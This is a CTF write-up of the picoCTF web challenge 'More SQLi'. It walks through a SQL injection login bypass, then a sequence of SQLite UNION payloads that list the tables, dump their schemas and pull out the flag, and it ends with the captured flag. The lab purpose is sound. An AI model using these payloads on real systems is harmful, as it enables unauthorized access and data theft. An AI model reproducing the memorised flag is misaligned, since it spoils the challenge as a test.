## Challenge: More SQLi

## Category: Web Exploitation

### Description: Can you find the flag on this website. 

### Hints:

#### 1. SQLiLite

The exploit of the chall was to use SQL injections to bypass login and exfiltrate data from the web server hosting the website. The login bypass is an obstacle that I have done before, which is to basically comment out a field and make the boolean expression in the login evaluate to true. The main issue I had was figuring out how to exfiltrate the database data. I tried copypasta'ing SQL and more specifically SQLite payloads by implementing a UNION statement, but none of them seemed to work, even when I commented out the latter part of the query made by the server and closed out the single quotation. I then realized that when I made a UNION statement, the number of columns of the table already being queried had to match up to the number of columns of the table referenced in the latter part of the statement. I made the adjustment by using 3 placement arguments for 3 columns in the tables I was exfitrating in the SELECT statements that I was placing in the UNION ones, allowing me to get the information I needed. Here are the payloads I used, sequentially:

>' OR 1=1;-- to bypass login

>' union SELECT tbl_name,1,2 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';--
>>Shows 4 tables: hints, more_table, offices, users

>' union SELECT sql,1,2 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name';--
>>Prints out commands used to generate table, shows its column names

>' union SELECT id,info,3 from hints;--
>> Nothing important, id and flag are the two columns in the table

>' union select id,flag,3 from more_table;--
>>BOOM flag unlocked

#### Reference: [1](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-version)

### Flag: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}

Solved by giggsterpuku
